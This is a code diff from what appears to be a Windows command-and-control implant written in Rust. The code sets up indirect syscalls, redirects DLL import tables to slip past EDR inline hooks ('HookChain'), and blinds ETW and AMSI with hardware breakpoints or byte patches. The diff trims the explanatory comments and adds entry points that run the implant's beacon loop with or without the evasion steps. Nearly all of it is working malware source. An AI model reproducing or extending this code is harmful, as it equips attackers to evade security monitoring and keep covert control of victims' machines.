@@ -82,17 +82,9 @@ unsafe fn bootstrap() -> Option<LiveNtdll> {
     let _ssn_table = ntdll.resolve_table_owned();
 
     // Indirect-syscall runtime: scan for the ntdll gadget + resolve SSNs
-    // (now over a FRESH KnownDlls\ntdll map when available — defeats inline
-    // hooks; falls back to the hooked ntdll otherwise).
     crate::syscalls::init_global();
 
-    // HookChain (P1, EDR_BLINDNESS_UPGRADE_2026-07.md §3): redirect subsystem
-    // DLL IATs (kernel32/KernelBase/win32u/user32/gdi32/advapi32) so their
-    // internal ntdll calls bypass EDR inline hooks — WITHOUT touching ntdll
-    // .text (PE-sieve hash-clean). Runs after syscalls::init_global (needs the
-    // SSN table + the ntdll syscall;ret gadget). The fresh-map SSN resolution
-    // in init_global means stubs are unhooked at this point, so the RVA→SSN
-    // read lands correct values.
+    // HookChain
     let _hookchain_count = unsafe { crate::hookchain::apply() };
 
     // .pdata gap scan + stack-spoof init.
@@ -103,25 +95,14 @@ unsafe fn bootstrap() -> Option<LiveNtdll> {
         let _ = crate::stack::stage_for(leaked);
     }
 
-    // ---- BLIND: HWBP primary → byte-patch fallback --------------------------
-    // HWBP (patchless): sets a hardware execute breakpoint on NtTraceEvent /
-    // AmsiScanBuffer that redirects to a shadow stub returning 0. No .text
-    // modification → invisible to PE-sieve hash checks. Preferred path.
-    //
-    // Byte-patch fallback: if VEH registration or shadow buffer init fails
-    // (e.g. early Windows builds, restricted IL, kernel AV blocks VirtualAlloc
-    // for RWX), fall back to the proven byte-patch track.
+    // BLIND: HWBP → byte-patch fallback
     let mut hwbp_ok = false;
     if unsafe { crate::blind_hwbp::init_shadow_buffer() } {
         let etw_slot = unsafe { crate::blind_hwbp::blind_etw_hwbp() };
-        // AMSI is best-effort (amsi.dll may not be loaded).
         let _amsi_slot = unsafe { crate::blind_hwbp::blind_amsi_hwbp() };
-        // Consider HWBP init successful if ETW suppression worked (the
-        // primary blind target; AMSI is optional).
         hwbp_ok = etw_slot.is_ok();
     }
     if !hwbp_ok {
-        // HWBP failed — fall back to byte-patch blind (proven, idempotent).
         let _ = crate::blind::patch_etw();
         let _ = crate::blind::patch_nt_trace_event();
         let _ = crate::blind::patch_amsi();
@@ -200,6 +181,55 @@ pub unsafe extern "system" fn nyx_entry() {
         }
     };
     crate::beacon::beacon_loop();
+}
+
+/// **Diagnostic entry**: runs beacon_oneshot with MINIMAL init (ntdll locate +
+/// CSPRNG register + syscalls only — NO hookchain/blind/pdata). Tests whether
+/// the evasion init in bootstrap() is causing the 0xC0000409 abort.
+/// Exit codes: same as beacon_oneshot (0xC1 = check-in failed, etc).
+#[no_mangle]
+pub unsafe extern "system" fn nyx_beacon_noevasion() {
+    // Minimal init: ntdll + CSPRNG + syscalls only.
+    init_minimal();
+    // Now run beacon_oneshot (crypto + transport — all verified OK in selftest).
+    let code = crate::beacon::beacon_oneshot();
+    unsafe { exit_in_entry(code) };
+}
+
+/// **Continuous beacon loop with minimal init** (no evasion). Same as
+/// `nyx_beacon_noevasion` but runs the continuous `beacon_loop()` instead of
+/// a single oneshot. For authorized testing where the evasion init (hookchain/
+/// blind/pdata) causes issues on the specific host.
+#[no_mangle]
+pub unsafe extern "system" fn nyx_entry_noevasion() {
+    init_minimal();
+    crate::beacon::beacon_loop();
+}
+
+/// Minimal initialization: ntdll locate + SSN table + syscalls + CSPRNG.
+/// Skips hookchain/blind/pdata (the evasion init that causes abort on some hosts).
+/// Also disables Foliage sleepmask (it depends on the evasion init — without
+/// the stack gap pool + heap regions it aborts on the first sleep cycle).
+unsafe fn init_minimal() {
+    let ntdll = match crate::resolve::LiveNtdll::locate() {
+        Some(n) => n,
+        None => unsafe { exit_in_entry(0xFE) },
+    };
+    let _ssn = ntdll.resolve_table_owned();
+    crate::syscalls::init_global();
+    nyx_protocol::crypto::register_csprng(csprng_fill);
+    crate::sleep::set_foliage_enabled(false);
+}
+
+/// Helper: resolve ExitProcess and exit with `code`. Never returns.
+unsafe fn exit_in_entry(code: u32) -> ! {
+    if let Some(addr) = crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess") {
+        let f: extern "system" fn(u32) -> ! = core::mem::transmute(addr);
+        f(code);
+    }
+    loop {
+        core::hint::spin_loop();
+    }
 }
 
 /// **Integration-test entry**: resolves ntdll + primes the indirect-syscall
